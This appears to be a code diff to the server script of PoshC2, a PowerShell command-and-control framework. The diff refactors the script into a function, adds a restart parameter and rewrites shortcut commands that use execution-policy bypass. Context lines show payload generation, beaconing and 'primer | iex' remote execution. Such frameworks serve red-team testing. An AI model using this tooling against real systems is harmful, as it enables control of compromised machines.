@@ -1,5 +1,6 @@
 # Written by @benpturner and @davehardy20
-Param($PoshPath)
+function C2-Server {
+Param($PoshPath, $RestartC2Server)
 
 # are we running with Administrator privileges to open port 80
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator'))
@@ -20,11 +21,14 @@ Write-Host -Object "                    \/     \/          \/         \/"  -Fore
 Write-Host "============ @benpturner & @davehardy20 ============" -ForegroundColor Green
 Write-Host "====================================================" `n -ForegroundColor Green
 
-$PathExists = Test-Path $PoshPath
+if (!$RestartC2Server) {
+    $PathExists = Test-Path $PoshPath
 
-if (!$PathExists) {
-    $PoshPath = Read-Host "Cannot find the PowershellC2 directory, please specify path: "
+    if (!$PathExists) {
+        $PoshPath = Read-Host "Cannot find the PowershellC2 directory, please specify path: "
+    }
 }
+
 # if poshpath ends with slash then remove this
 
 # tests for java JDK so we can create a Jar payload and applet
@@ -737,9 +741,9 @@ Write-Host -Object "Java Payload written to: $global:newdir\JavaPS.jar and apple
 }
 
 # if the server has been restarted using the Restart-C2Server shortcut
-if ($args[1]) 
+if ($RestartC2Server) 
 {
-    $global:newdir = $args[0]
+    $global:newdir = $RestartC2Server
     $payload = Get-Content "$global:newdir\payloads\payload.bat"
     Write-Host -Object "Using existing database and payloads: $global:newdir"
     $Database = "$global:newdir\PowershellC2.SQLite"
@@ -840,7 +844,8 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
     $prompt = Read-Host -Prompt "[3] Enter a new folder name for this project [$($global:newdir)]"
     $tempdir= ($global:newdir,$prompt)[[bool]$prompt]
-    $global:newdir = 'C:\Temp\'+$tempdir
+    $RootFolder = $PoshPath.TrimEnd("PowershellC2\")
+    $global:newdir = $RootFolder+"\"+$tempdir
 
     $defbeacontime = 5
     $prompt = Read-Host -Prompt "[4] Enter the default becaon time in seconds of the Posh C2 server (10% jitter is always applied) [$($defbeacontime)]"
@@ -1020,7 +1025,7 @@ primer | iex }'
     Write-Host `n"To re-open the Implant-Handler or C2Server, use the following shortcuts in this directory: "
     Write-Host "$global:newdir" `n  -ForegroundColor Green
     $SourceExe = "powershell.exe"
-    $ArgumentsToSourceExe = "-exec bypass $PoshPath\c2-server.ps1 $global:newdir"
+    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}C2-Server.ps1;C2-Server -RestartC2Server $global:newdir -PoshPath $PoshPath"
     $DestinationPath = "$global:newdir\Restart-C2Server.lnk"
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($DestinationPath)
@@ -1029,7 +1034,7 @@ primer | iex }'
     $Shortcut.Save()
 
     $SourceExe = "powershell.exe"
-    $ArgumentsToSourceExe = "-exec bypass -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir'"
+    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir'"
     $DestinationPath = "$global:newdir\Restart-Implant-Handler.lnk"
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($DestinationPath)
@@ -1794,3 +1799,4 @@ $message =[Convert]::ToBase64String($Bytes)
 }
 
 $listener.Stop()
+}
